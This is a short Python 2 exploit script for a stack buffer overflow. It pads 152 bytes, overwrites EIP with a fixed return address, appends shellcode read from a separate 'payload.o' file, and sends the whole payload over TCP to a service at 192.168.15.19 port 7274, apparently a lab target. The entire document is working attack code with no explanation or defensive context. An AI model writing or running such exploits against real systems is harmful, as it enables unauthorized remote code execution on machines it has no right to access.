#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import socket
from struct import *

host="192.168.15.19"
port = 7274

offset = "A" * 152
eip = pack('<L', 0x72742124)
esp = ""

with open("payload.o", "r") as f:
    esp = f.read()

payload = offset + eip + esp

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exp.connect((host,port))

print "[*] Enviando exploit..."
exp.recv(4096)
exp.send(payload)
exp.close()